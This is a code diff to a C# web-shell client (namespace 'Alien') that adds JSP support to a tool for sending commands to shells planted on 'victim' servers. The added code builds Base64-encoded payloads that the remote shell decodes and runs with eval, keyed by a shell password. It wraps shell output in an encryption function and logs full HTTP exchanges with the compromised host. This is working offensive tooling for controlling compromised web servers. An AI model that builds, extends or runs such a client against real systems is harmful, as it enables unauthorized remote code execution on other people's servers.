@@ -26,6 +26,8 @@ namespace Alien
         private bool bTokenExisted { get; set; }
         private int m_nSequence { get; set; }
 
+        public string m_szLastHttpResponse { get; set; } = string.Empty;
+
         /// <summary>
         /// 
         /// </summary>
@@ -37,6 +39,20 @@ namespace Alien
             { enLanguage.ASMX, "asmx" },
             { enLanguage.ASHX, "ashx" },
             { enLanguage.JSP, "jsp" },
+            { enLanguage.JSPX, "jspx" },
+            { enLanguage.Perl, "pl" },
+            { enLanguage.Python, "py" },
+            { enLanguage.Ruby, "rb" }
+        };
+
+        public static Dictionary<enLanguage, string> m_dicPayloadExtension = new Dictionary<enLanguage, string>()
+        {
+            { enLanguage.PHP, "php" },
+            { enLanguage.ASP, "asp" },
+            { enLanguage.ASPX, "aspx" },
+            { enLanguage.ASMX, "asmx" },
+            { enLanguage.ASHX, "ashx" },
+            { enLanguage.JSP, "java" },
             { enLanguage.JSPX, "jspx" },
             { enLanguage.Perl, "pl" },
             { enLanguage.Python, "py" },
@@ -81,6 +97,13 @@ namespace Alien
                 {
                     _ => fnWrapRuby,
                 }
+            },
+            {
+                enLanguage.JSP,
+                type => type switch
+                {
+                    _ => fnWrapJSP
+                }
             }
         };
 
@@ -122,6 +145,13 @@ namespace Alien
                 new string[]
                 {
                     "", "",
+                }
+            },
+            {
+                enLanguage.JSP,
+                new string[]
+                {
+                    "<%", "%>",
                 }
             }
         };
@@ -175,7 +205,7 @@ namespace Alien
                 enLanguage.Ruby, (type) =>
                 {
                     if (type == "CGI")
-                        return @"print ""Content-Type: text/plain\r\n\r\n"";require 'base64';eval(Base64.decode64('[PATTERN]'));";
+                        return @"print ""Content-Type: text/plain\r\n\r\n"";require 'base64';eval(Base64.decode64(""[PATTERN]""));";
 
                     return null;
                 }
@@ -196,6 +226,13 @@ namespace Alien
 
                     return null;
                 }
+            },
+            {
+                enLanguage.JSP, (type) =>
+                {
+
+                    return @"var bytes = java.util.Base64.getDecoder().decode(""[PATTERN]"");var codeStr = new java.lang.String(bytes, ""[ENCODING]"");eval(codeStr);";
+                }
             }
         };
 
@@ -208,7 +245,8 @@ namespace Alien
             { enLanguage.ASP, "Response.Write(\"[SPLITTER]\")" },
             { enLanguage.ASPX, "Response.Write(\"[SPLITTER]\");" },
             { enLanguage.Perl, "print \"[SPLITTER]\";" },
-            { enLanguage.Ruby, "print \"[SPLITTER]\";" }
+            { enLanguage.Ruby, "print \"[SPLITTER]\";" },
+            { enLanguage.JSP, "echo(\"[SPLITTER]\");" }
         };
 
         private Dictionary<enLanguage, Func<string, string>> m_dicEncapusulator = new Dictionary<enLanguage, Func<string, string>>()
@@ -310,6 +348,47 @@ namespace Alien
             sb.Append($"-----END {label}-----");
 
             return sb.ToString().Replace("\r\n", "\n");
+        }
+
+        private string fnBuildHttpDump(string url, HttpContent content, HttpResponseMessage resp, string responseBody)
+        {
+            var uri = new Uri(url);
+            var sb = new StringBuilder();
+
+            sb.AppendLine($"POST {uri.PathAndQuery} HTTP/1.1");
+            sb.AppendLine($"Host: {uri.Host}");
+
+            if (content != null)
+            {
+                foreach (var h in content.Headers)
+                    sb.AppendLine($"{h.Key}: {string.Join(", ", h.Value)}");
+
+                sb.AppendLine();
+                sb.AppendLine(content.ReadAsStringAsync().Result);
+            }
+            else
+            {
+                sb.AppendLine();
+            }
+
+            sb.AppendLine();
+
+            if (resp != null)
+            {
+                sb.AppendLine($"HTTP/{resp.Version} {(int)resp.StatusCode} {resp.ReasonPhrase}");
+
+                foreach (var h in resp.Headers)
+                    sb.AppendLine($"{h.Key}: {string.Join(", ", h.Value)}");
+
+                foreach (var h in resp.Content.Headers)
+                    sb.AppendLine($"{h.Key}: {string.Join(", ", h.Value)}");
+
+                sb.AppendLine();
+            }
+
+            sb.AppendLine(responseBody);
+
+            return sb.ToString();
         }
 
         /// <summary>
@@ -472,9 +551,7 @@ namespace Alien
                     }
                     catch
                     {
-                        frmMsgBox f = new frmMsgBox(resp.StatusCode.ToString(), szRespContent);
-                        f.ShowDialog();
-
+                        m_szLastHttpResponse = fnBuildHttpDump(m_victim.ShellURL, content, resp, szRespContent);
                         return string.Empty;
                     }
                 }
@@ -523,19 +600,19 @@ namespace Alien
                     }
                     catch (Exception ex)
                     {
-                        frmMsgBox f = new frmMsgBox("Decryption error", ex.Message);
+                        m_szLastHttpResponse = fnBuildHttpDump(m_victim.ShellURL, content, resp, szRespContent);
                         return string.Empty;
                     }
                 }
                 else
                 {
-                    frmMsgBox f = new frmMsgBox(resp.StatusCode.ToString(), szRespContent);
+                    m_szLastHttpResponse = fnBuildHttpDump(m_victim.ShellURL, content, resp, szRespContent);
                     return string.Empty;
                 }
             }
             catch (Exception ex)
             {
-                frmMsgBox f = new frmMsgBox("HTTP Error", ex.Message);
+                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return string.Empty;
             }
         }
@@ -656,6 +733,9 @@ namespace Alien
             string szSplitter = clsEzData.fnszGenerateRandomStr();
             string szPayload = fnGetPayload(szPayloadName, szSplitter);
 
+            if (szPayload.Contains("[ENCODING]"))
+                szPayload = szPayload.Replace("[ENCODING]", m_victim.ShellEncoding);
+
             if (m_victim.ShellPayloadType == enPayloadType.ECDH)
             {
                 szPayload = clsTamper.fnMergePayloadToOne(szPayload, asParams, m_victim.ShellLanguage);
@@ -669,7 +749,14 @@ namespace Alien
 
                 string szParams = string.Join("&", asParams);
                 //string? szLoader = m_dicDecodeFunc[m_victim.ShellLanguage](szPayloadMethod)?.Replace("[PATTERN]", Uri.EscapeDataString(clsEzData.fnszStre2b64(szPayload)));
-                string? szLoader = Uri.EscapeDataString(m_dicDecodeFunc[m_victim.ShellLanguage](szPayloadMethod))?.Replace("%5BPATTERN%5D", Uri.EscapeDataString(clsEzData.fnszStre2b64(szPayload))).Replace(" ", "%20");
+                string? szLoader = m_dicDecodeFunc[m_victim.ShellLanguage](szPayloadMethod);
+                if (string.IsNullOrEmpty(szLoader))
+                    throw new Exception("Cannot find any loader for: " + Enum.GetName(typeof(enLanguage), m_victim.ShellLanguage));
+
+                szLoader = Uri.EscapeDataString(szLoader)?
+                    .Replace("%5BPATTERN%5D", Uri.EscapeDataString(clsEzData.fnszStre2b64(szPayload)))
+                    .Replace("%5BENCODING%5D", Uri.EscapeDataString(m_victim.ShellEncoding))
+                    .Replace(" ", "%20");
 
                 szPayload = $"{m_victim.ShellPassword}={szLoader}&{szParams}";
             }
@@ -727,6 +814,9 @@ namespace Alien
                 const string split = "----------[THE CODE ABOVE WILL NOT BE INCLUDED]----------";
                 szPayload = szPayload.Split(new string[] { split }, StringSplitOptions.None).Last();
 
+                string szSplitFunc = m_dicSplitter[m_victim.ShellLanguage].Replace("SPLITTER", szSplitter);
+                szPayload = $"{szSplitFunc}\r\n{szPayload}\r\n{szSplitFunc}";
+
                 if (m_dicWrapper.ContainsKey(m_victim.ShellLanguage))
                 {
                     string szEncryptor = string.Empty;
@@ -734,8 +824,7 @@ namespace Alien
                     szPayload = m_dicWrapper[m_victim.ShellLanguage](szMethod)(szPayload, szEncryptor);
                 }
 
-                string szSplitFunc = m_dicSplitter[m_victim.ShellLanguage].Replace("SPLITTER", szSplitter);
-                szPayload = $"{szSplitFunc}{szPayload}{szSplitFunc}";
+                //MessageBox.Show(szPayload);
 
                 return szPayload;
             }
@@ -888,6 +977,42 @@ namespace Alien
 
             string szProcessed = szOriginalPayload;
             szProcessed = Regex.Replace(szProcessed, @"\bResponse\.Write\b", "print", RegexOptions.IgnoreCase);
+
+            return $"{szHeader}{szProcessed}{szFooter}";
+        }
+
+        private static string fnWrapJSP(string szOriginalPayload, string szEncryptor)
+        {
+            string szHeader =
+                "\r\n" +
+                (string.IsNullOrEmpty(szEncryptor) ?
+                "function Encrypt(data) {\r\n" +
+                "    // TODO: Add Java/JS encryption logic here\r\n" +
+                "    return data;\r\n" +
+                "}" : szEncryptor) + "\r\n\r\n" +
+                "var bos = new java.io.ByteArrayOutputStream();\r\n" +
+                "function Echo(s) {\r\n" +
+                "    if (s != null) {\r\n" +
+                "        var bytes = String(s).getBytes('UTF-8');\r\n" +
+                "        bos.write(bytes, 0, bytes.length);\r\n" +
+                "    }\r\n" +
+                "}\r\n\r\n";
+
+            string szFooter =
+                "\r\n\r\n" +
+                "var writer = response.getWriter();\r\n" +
+                "var encryptedData = Encrypt(bos.toString('UTF-8'));\r\n" +
+                "writer.print(encryptedData);\r\n" +
+                "writer.flush();\r\n" +
+                ";null;\r\n";
+
+            string szProcessed = szOriginalPayload;
+
+            szProcessed = Regex.Replace(szProcessed, @"\bResponse\.Write\b", "Echo", RegexOptions.IgnoreCase);
+            szProcessed = Regex.Replace(szProcessed, @"\bprint\b", "Echo", RegexOptions.IgnoreCase);
+            szProcessed = Regex.Replace(szProcessed, @"\becho\s*\(", "Echo(", RegexOptions.IgnoreCase);
+
+            szProcessed = Regex.Replace(szProcessed, @"\becho[ \t]+", "Echo ", RegexOptions.IgnoreCase);
 
             return $"{szHeader}{szProcessed}{szFooter}";
         }
